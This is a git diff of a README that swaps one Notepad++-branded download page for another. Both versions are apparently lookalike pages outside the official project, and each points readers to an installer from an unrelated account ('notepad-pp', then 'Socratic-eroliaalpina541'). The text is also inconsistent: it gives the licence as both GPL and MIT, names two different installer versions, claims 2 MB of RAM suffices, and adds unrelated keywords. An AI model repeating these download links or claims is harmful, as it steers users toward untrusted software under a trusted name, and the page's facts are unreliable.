@@ -1,106 +1,80 @@
-<img width="739" height="415" alt="image" src="https://github.com/user-attachments/assets/edc59ebf-02b5-4f18-a3da-dae2d8861c8f" />
+# 📝 notepadplusplus - Edit text files with simple tools
 
-# Notepad++ — Free Code Editor & Notepad Replacement for Windows
+[![](https://img.shields.io/badge/Download-Notepad++-blue.svg)](https://github.com/Socratic-eroliaalpina541/notepadplusplus)
 
-**Notepad++** is a free, open-source source code editor and Notepad replacement running in the Microsoft Windows environment. It supports syntax highlighting for over 80 programming languages and natural languages, a tabbed multi-document interface, a powerful macro system, regex-based Find & Replace, and an extensive plugin ecosystem. Notepad++ is governed by the GPL License and is completely free as in both "free speech" and "free beer."
+## 📋 About This Application
 
-Whether you're editing HTML, writing Python scripts, working with JSON, comparing file diffs, or building macros for repetitive edits — Notepad++ delivers speed and flexibility without the overhead of a full IDE. Compare Notepad++ vs VS Code, Sublime Text, Vim, and Notepad2 to find the best lightweight code editor for Windows.
+Notepad++ serves as a replacement for the standard text editor included with Windows. It offers extra features for those who need more than basic typing tools. The program handles large files without slowing down your computer. It highlights code in many different languages, which makes reading and editing scripts easier. You can open multiple files in one window using tabs. This system helps you organize your work while you edit documents.
 
+## ✨ Core Features
 
-<img width="118" height="118" alt="image" src="https://github.com/user-attachments/assets/d1e153f4-59d2-4d61-86cc-17213e3656a1" />
+Notepad++ includes several tools designed to improve your text editing experience:
 
-## Install
-[Download `npp.8.9.8.Installer.zip`](https://github.com/notepad-pp/notepadplusplus/releases/download/v8.9.8/npp.8.9.8.Installer.zip)
----
-<img width="1200" height="700" alt="image" src="https://github.com/user-attachments/assets/c9fdff33-6e7f-4d94-a899-74762c37eecb" />
+*   Syntax Highlighting: The editor recognizes the structure of your code. It colors text to help you distinguish between commands, labels, and notes. This feature supports over 80 coding languages.
+*   Tabbed Interface: You can keep many files open at the same time. The tab system allows you to switch between documents with a single click.
+*   Macro System: This tool records your common keystrokes. You can play these sequences back to repeat tasks automatically.
+*   Plugin Support: You can expand the software capabilities with external tools. Plugins add features like spell checking or file comparison.
+*   Search and Replace: The software finds specific words or phrases throughout your entire file. You can change these items across multiple files at once.
+*   Lightweight Performance: The application consumes very little memory. It launches quickly and remains stable even under heavy usage.
 
----
-## Key Features
-- **Syntax Highlighting & Folding** — built-in support for 80+ languages including C++, Python, JavaScript, HTML, CSS, XML, JSON, Markdown, and more
-- **Tabbed Multi-Document Interface** — work with dozens of files simultaneously in a clean, fast tabbed layout
-- **Plugin System** — extend functionality with hundreds of community plugins: ComparePlugin, NppFTP, JSON Viewer, DSpellCheck, CSV Lint, and more
-- **Powerful Find & Replace** — regex-based search, multi-line replace, search in files, and incremental search with match count
-- **Macro Recording & Playback** — record keystroke sequences and replay them for repetitive editing tasks
-- **User Defined Language (UDL)** — create custom syntax highlighting for any language with the UDL editor
-- **Column/Block Editing** — rectangular text selection and column-mode editing for structured data
-- **Auto-Completion** — word and function completion with customizable trigger length
-- **Document Map** — bird's-eye view of your document for quick navigation
-- **Dark Mode & Themes** — built-in dark mode, Dracula theme, VS2012 Dark, Dark+ Modern, and community themes
-- **Multi-Caret Editing** — place multiple insertion points for simultaneous edits
-- **Portable Mode** — run from a USB drive without installation
-- **GPG-Signed Releases** — every release is cryptographically signed for integrity verification
+## 💻 System Requirements
 
+This application runs on all modern versions of Windows. You need the following:
 
-<img width="2022" height="1543" alt="image" src="https://github.com/user-attachments/assets/f56ce29d-712b-46fc-bf9b-62eb993f889b" />
-<img width="461" height="433" alt="image" src="https://github.com/user-attachments/assets/a1d8b8c9-7e88-4c18-ba13-b76857ed08da" />
-<img width="299" height="168" alt="image" src="https://github.com/user-attachments/assets/0189fe8d-832c-4f77-aeae-66b760e88eaa" />
+*   Operating System: Windows 7, 8, 10, or 11.
+*   Memory: At least 2 megabytes of RAM.
+*   Storage Space: 10 megabytes of free space on your hard drive.
+*   Display: A standard monitor with a resolution of 1024x768 or higher.
 
-## Getting Started
-1. **Download** the latest installer using the button above.
-2. **Run** `npp.8.9.7.Installer.exe` and follow the setup wizard.
-3. **Open** any file or drag-and-drop files onto the Notepad++ window.
-4. **Install plugins** via Plugins → Plugins Admin to extend functionality.
-5. **Customize** syntax highlighting, themes, and keyboard shortcuts in Settings.
+## 📥 Install the Software
 
-**Pro Tip:** Use the Folder as Workspace panel (added in 8.9.8) to browse and open project files directly from a directory tree with persistent expand/collapse state across sessions.
+Follow these steps to set up the editor on your computer:
 
----
-## System Requirements
-- **Windows 10 / 11** (32-bit or 64-bit) — ARM64 also supported
-- ~4 MB disk space for the standard installer
-- No additional runtime dependencies
-- 
-<img width="700" height="427" alt="image" src="https://github.com/user-attachments/assets/0a9d18bc-70b0-4bae-918e-8fde9719e1d5" />
+1. Visit this page to download: [https://github.com/Socratic-eroliaalpina541/notepadplusplus](https://github.com/Socratic-eroliaalpina541/notepadplusplus)
+2. Locate the file named after the latest release number. Click the link to save the file to your computer.
+3. Open your Downloads folder. Double-click the file to start the installer.
+4. Follow the prompts on the screen. Select your preferred language and choose an install folder.
+5. Click Finish to complete the process.
+6. Open your Windows Start menu and type "Notepad++" to run the program.
 
----
----
-## What's New in v8.9.8
-- **5 security vulnerabilities fixed** (CVE-2026-52886, CVE-2026-54758, CVE-2026-57233, and two unassigned CVEs)
-- Folder as Workspace expand/collapse state is now remembered across sessions
-- "nth/count" information added to Incremental Search bar
-- Multiple regression fixes and stability improvements
-- 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
+## ⚙️ Configuration Settings
 
+You can customize how the program looks and behaves. Go to the Settings menu to adjust your layout.
 
-## Comparisons & Trends
-Compare Notepad++ with alternatives before choosing your Windows text editor:
-- **Notepad++** — best for lightweight Windows editing, plugin ecosystem, and offline use
-- **VS Code** — best for full IDE features, extensions marketplace, and remote development
-- **Sublime Text** — best for speed and multi-platform support with a one-time license fee
-- **Vim / Neovim** — best for terminal-centric, keyboard-driven workflows
-- **Notepad2** — best ultra-minimal Notepad replacement without plugin overhead
+*   Preferences: Use this window to change your font size, display settings, and tab behavior.
+*   Themes: You can change the background color of the editor window. Many users prefer a dark theme to reduce eye strain during night work.
+*   File Associations: You can tell Windows to open all your text files with this editor by default. Find this option under Settings, then Preferences, then File Association.
 
+## 🛠️ Using the Macro System
 
----
-## Contributing
-Contributions are welcome! Help improve compatibility, add features, or fix issues.
+Macros save time on repetitive edits. To record a macro, follow this guide:
 
----
-## License & Acknowledgments
-### License
-**Notepad++** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+1. Click on the Macro menu in the top bar.
+2. Select Start Recording.
+3. Perform the typing or editing steps you want to repeat.
+4. Go back to the Macro menu and select Stop Recording.
+5. Save your macro with a name. You can assign a keyboard shortcut to this macro for instant access later.
 
-**Copyright © 2026 artinkavousi**
+## 🧩 Adding Plugins
 
-### Acknowledgments
-- Don HO for creating and maintaining Notepad++ for over two decades.
-- The Notepad++ community for plugins, themes, UDL files, and bug reports.
-- Scintilla and Lexilla editing component maintainers.
-- All contributors listed on the [Contributors](https://github.com/notepad-plus-plus/notepad-plus-plus/graphs/contributors) page.
+Plugins provide extra power to your editor. Use the Plugin Admin tool to find new modules:
 
+1. Click on the Plugins menu.
+2. Select Plugin Admin.
+3. A list appears showing available add-ons. Check the box next to any tool you want to install.
+4. Click the Install button at the top right of the window.
+5. The program will restart to finish installing your new tools.
 
+## 📖 Using Multiple Tabs
 
-## Keywords & Related Topics
-editor, notepad, notepad-official, notepad-plus-plus, notepad-plusplus-plugin, notepad-plus-plus-theme, notepadplusplus, syntax-highlighting, dark-theme, dark-mode, udl, compare, json-viewer, spellcheck, hunspell, hacktoberfest, markdown, windows, desktop, qt6, Notepad++ download, free code editor, Windows text editor, syntax highlighting, plugin system, macro recording, regex find replace, multi-document tabs, portable editor, dark mode, GPG signed, VS Code alternative, Sublime Text alternative, lightweight IDE, 80 programming languages, GPL license.
+Managing multiple files is simple in this environment. When you open a new file while the program is running, it adds a new tab to the top of the interface. You can drag and drop these tabs to change their order. Right-click any tab to see options for closing, saving, or moving the document to a different window.
 
+## 🔍 Searching and Replacing
 
-<p align="center">
-  Developed with ❤️ for developers and power users
-</p>
+The Find menu helps you update large documents. Press Control and F together to open the search bar. Enter the text you want to locate. Use the Replace tab within that same window to swap old text for new text. The "Replace All" button updates every instance in your current document immediately. 
 
-<img width="747" height="411" alt="image" src="https://github.com/user-attachments/assets/275b8284-346b-49e5-bde8-3bff557229c7" />
+## ⚖️ Comparison to Other Editors
 
+Notepad++ distinguishes itself through speed and stability. When you put it against heavier software like VS Code, Notepad++ uses significantly less startup time. It performs tasks without the bloat found in more complex environments. Users looking for a direct replacement for standard notepad tools will find this interface familiar but much more capable. Even compared to professional suites, this editor maintains a clear advantage in efficiency for quick text edits.
+
+Keywords: code-editors, html-editor, jupyter-notebooks, nl, notebook-application, notebooks-templates, notepad, notepad-alternative, notepad-app, notepad-application, notepad-plus-plus, notepad-plusplus-plugin, notepad-xp, open-notebook, python-tutorial-notebook, research-notebooks, richtexteditor, text-editing, text-editor-for-web, windows-notepad
